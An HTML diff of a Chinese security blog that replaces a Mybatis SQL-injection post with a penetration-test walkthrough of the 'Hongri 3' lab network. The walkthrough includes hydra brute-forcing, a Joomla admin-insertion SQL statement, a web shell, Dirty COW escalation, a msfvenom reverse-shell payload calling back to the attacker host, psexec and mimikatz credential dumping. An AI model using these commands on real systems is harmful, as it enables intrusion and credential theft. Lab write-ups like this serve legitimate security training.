@@ -4,11 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Mybatis 注入, marin的小窝">
-    <meta name="description" content="Mybatis 注入Mybatis 框架Mybatis 是一个 java 持久层框架（Dao 层），用来连接 java 和关系型数据库，是执行 SQL 语句的帮手，不再需要使用 JDBC 连接
-Mybatis 的使用有几个部分
+    <meta name="keywords" content="红日靶场 3, marin的小窝">
+    <meta name="description" content="红日靶场 3靶场搭建创建一个 VMnet2​，网段是 192.168.93.0/24​，因为默认配置就是这个，修改成其他的 VMnet 还需要修改
 
-核心配置 ">
+
+这里加载后记得打快照，这个靶机都是挂起状态的，不打快照重启后可能就打不开服务
+这里打开后">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +21,7 @@ Mybatis 的使用有几个部分
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Mybatis 注入 | marin的小窝</title>
+    <title>红日靶场 3 | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -252,12 +253,12 @@ Mybatis 的使用有几个部分
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%8D%E5%81%A5_97310837.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20230618_234051.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Mybatis 注入</h1>
+                    <h1 class="description center-align post-title">红日靶场 3</h1>
                 </div>
             </div>
         </div>
@@ -281,16 +282,12 @@ Mybatis 的使用有几个部分
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web/">
-                                <span class="chip bg-color">web</span>
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
                             </a>
                         
-                            <a href="/tags/java/">
-                                <span class="chip bg-color">java</span>
-                            </a>
-                        
-                            <a href="/tags/SQL-%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">SQL 注入</span>
+                            <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                                <span class="chip bg-color">红日靶场系列</span>
                             </a>
                         
                     </div>
@@ -301,8 +298,8 @@ Mybatis 的使用有几个部分
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/WEB/" class="post-category">
-                                WEB
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
                             </a>
                         
                     </div>
@@ -314,7 +311,7 @@ Mybatis 的使用有几个部分
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-12-13
+                    2026-03-23
                 </div>
                 
 
@@ -338,60 +335,292 @@ Mybatis 的使用有几个部分
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Mybatis-注入"><a href="#Mybatis-注入" class="headerlink" title="Mybatis 注入"></a>Mybatis 注入</h1><h2 id="Mybatis-框架"><a href="#Mybatis-框架" class="headerlink" title="Mybatis 框架"></a>Mybatis 框架</h2><p>Mybatis 是一个 java 持久层框架（Dao 层），用来连接 java 和关系型数据库，是执行 SQL 语句的帮手，不再需要使用 JDBC 连接</p>
-<p>Mybatis 的使用有几个部分</p>
-<ol>
-<li><p>核心配置 XML 文件：配置数据库地址、名字、密码等</p>
-</li>
-<li><p>Mybatis 工具类</p>
-</li>
-<li><p>java 实体类：普通的 java 对象，例如 User 类</p>
-</li>
-<li><p>Mapper 接口：定义的接口，写明需要执行的方法</p>
-</li>
-<li><p>XML 映射文件 Mapper.xml：这里会编写接口中方法对应的 SQL 语句，Mybatis 会自动解析这里的 SQL 语句，这里的语句需要在配置文件中注册</p>
-<p>java 调用接口中的方法时，会自动到 XML 文件中获取 SQL 语句，然后发给数据库执行，将返回的数据包装成实体类返回</p>
-</li>
-</ol>
-<h3 id="参数符号"><a href="#参数符号" class="headerlink" title="参数符号"></a>参数符号</h3><p>Mybatis 的 SQL 语句需要手动编写，编写 XML 文件时，Mybatis 支持两种参数符号</p>
-<ul>
-<li><code>#{}</code>​：使用预编译，将参数部分使用 <code>?</code> 替代，后续放入的参数不会进行 SQL 编译，而是当作字符串处理，可以避免 SQL 注入漏洞</li>
-<li><code>${}</code>：使用的是拼接字符串，容易导致 SQL 注入漏洞</li>
-</ul>
+                <h1 id="红日靶场-3"><a href="#红日靶场-3" class="headerlink" title="红日靶场 3"></a>红日靶场 3</h1><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>创建一个 <code>VMnet2</code>​，网段是 <code>192.168.93.0/24</code>​，因为默认配置就是这个，修改成其他的 <code>VMnet</code> 还需要修改</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260315220032-0d6b3v9.png" alt="image"></p>
+<blockquote>
+<p>这里加载后记得打快照，这个靶机都是挂起状态的，不打快照重启后可能就打不开服务</p>
+<p>这里打开后一堆毛病，主要启动服务的 web-ubantu 打开就报错，会导致访问页面就 502 了，最后 VM 版本调回 16.2 就没事了</p>
+</blockquote>
+<p>web-centos：</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317095605-3eetskl.png" alt="image"></p>
+<p>这里捣鼓了半天，后来发现这个靶机是热加载的，不需要关机更换网卡设置，开机就能修改</p>
+<p>进去要重启网卡，这里还有个问题，重启网卡一直失败</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">service network restart</code></pre>
+
+<p>需要在设置中修改一下才能成功</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317100032-4si1znc.png" alt="image"></p>
+<p>要将这两个都勾选上</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317100106-tza4xab.png" alt="image"></p>
+<p>PC：</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260316213622-7guedsb.png" alt="image"></p>
+<p>web-ubantu：</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260316213622-7guedsb.png" alt="image"></p>
+<p>win 2008：</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260316213622-7guedsb.png" alt="image"></p>
+<p>server 2012：</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260316213622-7guedsb.png" alt="image"></p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>这里模拟实战环境，是不知道这里 IP 地址是什么，所以扫描整个 C 段</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sn 192.168.154.0&#x2F;24</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317144222-v5laqnj.png" alt="image"></p>
+<p>确定目标 IP 就是 <code>192.168.154.128</code>，进行端口扫描</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sS -sV -p- 192.168.154.128</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317144341-xs126wc.png" alt="image"></p>
+<p>这里看到有 ssh 和 mysql 服务，尝试了一下弱密码，成功爆出来一个弱密码</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">hydra -C mysql-betterdefaultpasslist.txt mysql:&#x2F;&#x2F;192.168.154.128</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317144449-5h59az5.png" alt="image"></p>
+<h3 id="mysql-渗透（失败）"><a href="#mysql-渗透（失败）" class="headerlink" title="mysql 渗透（失败）"></a>mysql 渗透（失败）</h3><p>直接连接上去，就是 root 权限，而且 IP 像内网的 IP</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mysql -u root -h 192.168.154.128 -p123</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317152548-i4bq24a.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317152555-n2tlu1h.png" alt="image"></p>
+<p>看看能不能写日志 shell，权限和配置够了，打开一下日志功能</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317152819-8bzedkm.png" alt="image"></p>
+<p>但是这里要写日志不知道 web 路径，先放一放</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317152913-iu9g02a.png" alt="image"></p>
+<p>这里本来尝试随便写一个文件的，但是好像配置了什么导致不成功，这个方法应该是被 ban 了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317154819-inip6km.png" alt="image"></p>
 <p>‍</p>
-<h2 id="Mybatis-注入-1"><a href="#Mybatis-注入-1" class="headerlink" title="Mybatis 注入"></a>Mybatis 注入</h2><p>Mybatis 框架的预编译会避免产生 SQL 注入漏洞，容易产生的有以下几种情况</p>
+<h3 id="网站渗透"><a href="#网站渗透" class="headerlink" title="网站渗透"></a>网站渗透</h3><p>是一个 php 环境，cms 是 <code>Joomla</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317152957-akf3vqk.png" alt="image"></p>
+<p>扫目录发现挺多东西的</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">[14:43:31] 403 -  280B  - &#x2F;.configuration.php.swp
+[14:43:32] 403 -  280B  - &#x2F;.ht_wsr.txt
+[14:43:32] 403 -  280B  - &#x2F;.htaccess.bak1
+[14:43:32] 403 -  280B  - &#x2F;.htaccess.orig
+[14:43:32] 403 -  280B  - &#x2F;.htaccess.sample
+[14:43:32] 403 -  280B  - &#x2F;.htaccess_extra
+[14:43:32] 403 -  280B  - &#x2F;.htaccess_sc
+[14:43:32] 403 -  280B  - &#x2F;.htaccessOLD2
+[14:43:32] 403 -  280B  - &#x2F;.htaccess_orig
+[14:43:32] 403 -  280B  - &#x2F;.htm
+[14:43:32] 403 -  280B  - &#x2F;.html
+[14:43:32] 403 -  280B  - &#x2F;.htaccess.save
+[14:43:32] 403 -  280B  - &#x2F;.htaccessBAK
+[14:43:32] 403 -  280B  - &#x2F;.htpasswd_test
+[14:43:32] 403 -  280B  - &#x2F;.htaccessOLD
+[14:43:32] 403 -  280B  - &#x2F;.httr-oauth
+[14:43:32] 403 -  280B  - &#x2F;.htpasswds
+[14:43:33] 403 -  280B  - &#x2F;.php
+[14:43:35] 200 -    0B  - &#x2F;2.php
+[14:43:36] 200 -   24KB - &#x2F;1.php
+[14:43:42] 301 -  326B  - &#x2F;administrator  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;administrator&#x2F;
+[14:43:42] 200 -   31B  - &#x2F;administrator&#x2F;cache&#x2F;
+[14:43:42] 301 -  331B  - &#x2F;administrator&#x2F;logs  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;administrator&#x2F;logs&#x2F;
+[14:43:42] 200 -  526B  - &#x2F;administrator&#x2F;includes&#x2F;
+[14:43:42] 200 -   31B  - &#x2F;administrator&#x2F;logs&#x2F;
+[14:43:44] 200 -    2KB - &#x2F;administrator&#x2F;index.php
+[14:43:44] 200 -    2KB - &#x2F;administrator&#x2F;
+[14:43:46] 301 -  316B  - &#x2F;bin  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;bin&#x2F;
+[14:43:46] 200 -   31B  - &#x2F;bin&#x2F;
+[14:43:47] 301 -  318B  - &#x2F;cache  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;cache&#x2F;
+[14:43:47] 200 -   31B  - &#x2F;cache&#x2F;
+[14:43:48] 200 -   31B  - &#x2F;cli&#x2F;
+[14:43:48] 200 -   31B  - &#x2F;components&#x2F;
+[14:43:48] 301 -  323B  - &#x2F;components  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;components&#x2F;
+[14:43:49] 200 -    2KB - &#x2F;configuration.php~
+[14:43:49] 200 -    0B  - &#x2F;configuration.php
+[14:43:55] 200 -    1KB - &#x2F;htaccess.txt
+[14:43:56] 200 -   31B  - &#x2F;images&#x2F;
+[14:43:56] 301 -  319B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;images&#x2F;
+[14:43:56] 200 -   31B  - &#x2F;includes&#x2F;
+[14:43:56] 301 -  321B  - &#x2F;includes  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;includes&#x2F;
+[14:43:58] 200 -    4KB - &#x2F;index.php
+[14:43:58] 200 -    3KB - &#x2F;index.php&#x2F;login&#x2F;
+[14:43:58] 301 -  321B  - &#x2F;language  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;language&#x2F;
+[14:43:59] 200 -   31B  - &#x2F;layouts&#x2F;
+[14:43:59] 301 -  322B  - &#x2F;libraries  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;libraries&#x2F;
+[14:43:59] 200 -   31B  - &#x2F;libraries&#x2F;
+[14:43:59] 200 -    7KB - &#x2F;LICENSE.txt
+[14:44:01] 301 -  318B  - &#x2F;media  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;media&#x2F;
+[14:44:01] 200 -   31B  - &#x2F;media&#x2F;
+[14:44:02] 301 -  320B  - &#x2F;modules  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;modules&#x2F;
+[14:44:02] 200 -   31B  - &#x2F;modules&#x2F;
+[14:44:07] 301 -  320B  - &#x2F;plugins  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;plugins&#x2F;
+[14:44:07] 200 -   31B  - &#x2F;plugins&#x2F;
+[14:44:09] 200 -    2KB - &#x2F;README.txt
+[14:44:10] 200 -  392B  - &#x2F;robots.txt
+[14:44:11] 403 -  280B  - &#x2F;server-status
+[14:44:11] 403 -  280B  - &#x2F;server-status&#x2F;
+[14:44:15] 301 -  322B  - &#x2F;templates  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;templates&#x2F;
+[14:44:15] 200 -   31B  - &#x2F;templates&#x2F;index.html
+[14:44:15] 200 -    0B  - &#x2F;templates&#x2F;protostar&#x2F;
+[14:44:15] 200 -    0B  - &#x2F;templates&#x2F;beez3&#x2F;
+[14:44:15] 200 -   31B  - &#x2F;templates&#x2F;
+[14:44:15] 200 -    0B  - &#x2F;templates&#x2F;system&#x2F;
+[14:44:16] 301 -  316B  - &#x2F;tmp  -&gt;  http:&#x2F;&#x2F;192.168.154.128&#x2F;tmp&#x2F;
+[14:44:16] 200 -   31B  - &#x2F;tmp&#x2F;
+[14:44:19] 200 -  628B  - &#x2F;web.config.txt</code></pre>
+
+<blockquote>
+<p>这里有个 2.php 直接有 phpinfo 了，不知道是没删干净还是啥，先不用</p>
+</blockquote>
+<p>这里还扫到了一个 <code>configuration.php~</code>，这个应该就是 Joomla 的配置文件，这里还有一个用户的账号密码，但是登录不到后台</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317154128-gz89ka4.png" alt="image"></p>
+<p>这里可以看到有一个 log_path，刚好可以给 mysql 利用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317154337-uv73q7x.png" alt="image"></p>
+<p>这里还有一个后台，密码可以到 mysql 中去读</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317154915-aved7o5.png" alt="image"></p>
+<p>这里可以看到这个 <code>am2zu_users</code> 表中存储着用户信息，但是密码被加密了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317155242-gu4w0th.png" alt="image"></p>
+<p>这里翻了一下，发现官方有些如何添加超级管理员，那还说啥了，直接拿来用</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317155916-54ylxgo.png" alt="image"></p>
+<p>但这里要修改一下表名，这里修改的密码是 <code>secret</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">INSERT INTO &#96;am2zu_users&#96;
+   (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastResetTime&#96;)
+VALUES (&#39;Administrator2&#39;, &#39;admin2&#39;,
+    &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;, &#39;&#39;, NOW(), NOW(), NOW());
+INSERT INTO &#96;am2zu_user_usergroup_map&#96; (&#96;user_id&#96;,&#96;group_id&#96;)
+VALUES (LAST_INSERT_ID(),&#39;8&#39;);</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317155956-ifn2vmf.png" alt="image"></p>
+<p>成功登录后台</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317160033-j2co6x1.png" alt="image"></p>
+<p>这里可以通过修改后台主题的文件来上 shell</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317160959-htahsl2.png" alt="image"></p>
+<p>这里修改 <code>error.php</code> 文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317161219-8d2u97z.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317161305-xl9lodg.png" alt="image"></p>
+<p>没有禁用 eval，试试马</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317161327-k3nk3h5.png" alt="image"></p>
+<p>可以执行命令，但是没有 <code>system</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317161726-su1l7ss.png" alt="image"></p>
+<p>不管，直接上蚁剑，看看能不能上传文件，能上传文件就 win 了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317161844-utwtpmt.png" alt="image"></p>
+<p>蚁剑有一个插件，可以用来尝试绕过</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317162324-etsipj3.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317162411-mzkb83p.png" alt="image"></p>
+<h2 id="C2-上线（失败）"><a href="#C2-上线（失败）" class="headerlink" title="C2 上线（失败）"></a>C2 上线（失败）</h2><p>这里目标机器是 linux，用 cs 需要一个插件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317165013-xmgngda.png" alt="image"></p>
+<p>上传这个马</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317165025-7pbimvv.png" alt="image"></p>
+<p>但是这里又是连接不上，不知道为什么，只能先换一条路</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317165542-3cekl3l.png" alt="image"></p>
+<p>这里看到 tmp 目录下有一个 mysql 目录，进去看到一个文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317165948-gkcj2tk.png" alt="image"></p>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>尝试用来 ssh 登录，这里直接连会报错，因为目标版本太低了，需要加个配置，成功获取到一个普通用户权限</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ssh -o HostKeyAlgorithms&#x3D;+ssh-rsa -o PubkeyAcceptedKeyTypes&#x3D;+ssh-rsa wwwuser@192.168.154.128</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317170339-41zv6b7.png" alt="image"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先尝试 suid 提权</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317170709-0mmwz8v.png" alt="image"></p>
+<p>都失败哩，甚至还有报告（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317173433-c6yr71h.png" alt="image"></p>
+<p>这里查到一种脏牛提权，版本应该是匹配上了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">uname -a
+cat &#x2F;etc&#x2F;redhat-release</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317174204-urlf5yh.png" alt="image"></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">searchsploit dirty cow</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317174615-rxh2m82.png" alt="image"></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">searchsploit -m 40839.c</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317174715-6hl9vlf.png" alt="image"></p>
+<p>下载下来后起一个 http 服务，让服务器下载一个，其实直接文件上传上去也可以</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">wget http:&#x2F;&#x2F;192.168.154.130:8088&#x2F;40839.c -O dirty.c</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317174846-vy0so1v.png" alt="image"></p>
+<p>这里要先编译一下，然后执行生成的文件，然后加上密码就行</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">gcc --version
+gcc -pthread dirty.c -o dirty -lcrypt</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317175445-wd9v9tf.png" alt="image"></p>
+<p>提权成功</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317175550-6fpa02s.png" alt="image"></p>
+<p>使用 msf 上线，cs 好像搞不定</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.154.130 LPORT&#x3D;4444 -f elf &gt; shell.elf</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317180853-ice3krd.png" alt="image"></p>
+<p>启动一下服务</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">msfconsole -q
+msf6 &gt; use exploit&#x2F;multi&#x2F;handler
+msf6 &gt; set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
+msf6 &gt; set LHOST 192.168.154.130
+msf6 &gt; set LPORT 4444
+msf6 &gt; run</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317181514-fd7av84.png" alt="image"></p>
+<p>然后将这个文件传过去，成功上线</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317182645-l1utmk2.png" alt="image"></p>
+<p>然后可以使用命令看看基础信息</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sysinfo
+ifconfig</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317185911-k913jk3.png" alt="image"></p>
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>将内网网段添加到路由表中</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">run autoroute -s 192.168.93.0&#x2F;24
+run autoroute -p</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317190040-mz9vq1a.png" alt="image"></p>
+<p>然后要配置全局代理</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">background
+use auxiliary&#x2F;server&#x2F;socks_proxy
+set srvport 1080
+set version 4a
+run</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317190526-f7t6cad.png" alt="image"></p>
+<p>然后修改 kali 的配置，在最后一行加上 <code>socks4 127.0.0.1 1080</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo nano &#x2F;etc&#x2F;proxychains4.conf</code></pre>
+
+<p>然后就可以利用这个代理去扫描内网了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">proxychains4 nmap -Pn -sT -p 445,135,80 --open 192.168.93.0&#x2F;24</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317192922-p6oiu9u.png" alt="image"></p>
+<p>这里可以确定有 5 个目标，100 就是拿到权限的这个</p>
+<p><code>192.168.93.10</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317194220-hmpkrlz.png" alt="image"></p>
+<p><code>192.168.93.20</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317194518-jzea53q.png" alt="image"></p>
+<p><code>192.168.93.30</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317194936-m62nk15.png" alt="image"></p>
+<p><code>192.168.93.120</code> 这个是服务器的 IP，所以这个服务是搭建在内网的，只是用外网的这个转发出去，所以这个服务器的权限也相当于拿到了，只是权限不够高</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317195151-6lgp4pv.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317195340-fzmup43.png" alt="image"></p>
+<p>这里像尝试永恒之蓝，都失败了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317200141-xow52i1.png" alt="image"></p>
+<p>这里没辙了，只能尝试爆破密码了，这个密码我找了一圈发现我的字典中都没有（，又不想爆太大，就直接添加到我的字典中了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">proxychains4 hydra -l administrator -P 500-worst-passwords.txt smb:&#x2F;&#x2F;192.168.93.20</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317201910-msmc79g.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317202025-jd6f2du.png" alt="image"></p>
+<p>然后就可以利用 msf 的 psexec 模块来获取权限</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec
+
+set RHOSTS 192.168.93.20
+set SMBUser administrator
+set SMBPass 123456
+
+set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp
+set LPORT 4444
+
+run</code></pre>
+
+<p>这里甚至是 system 用户</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317202428-z5h8s2s.png" alt="image"></p>
+<p>信息收集</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317202538-iz8h8xr.png" alt="image"></p>
+<p>域控机就是 <code>WIN-8GA56TNV3MV</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317202755-wp2xqu5.png" alt="image"></p>
+<p>获取到域控机的 IP 就是 <code>192.168.93.10</code>，剩下两台几次其实都拿下了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317202907-by5hbje.png" alt="image"></p>
+<p>这里可以加载 mimikatz</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">load kiwi
+creds_wdigest
+creds_all</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317203345-8uqmqg2.png" alt="image"></p>
+<p>这里成功抓到一个密码，这个 test 就是当前域环境，尝试一下是不是密码 <code>zxcASDqw123!!</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">proxychains4 hydra -l administrator -p &#39;zxcASDqw123!!&#39; smb:&#x2F;&#x2F;192.168.93.10</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260317204210-586p8tb.png" alt="image"></p>
+<p>这样就成功拿下最后的域控机器了</p>
 <p>‍</p>
-<h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p>在模糊查询中使用 <code>#{}</code>​ 传入参数会报错，如果修改为 <code>${}</code> 就会产生 SQL 注入漏洞</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;select id&#x3D;&quot;getUsersByIds&quot; resultType&#x3D;&quot;User&quot;&gt;
-	select * from users where username like &#39;%$&#123;username&#125;%&#39;
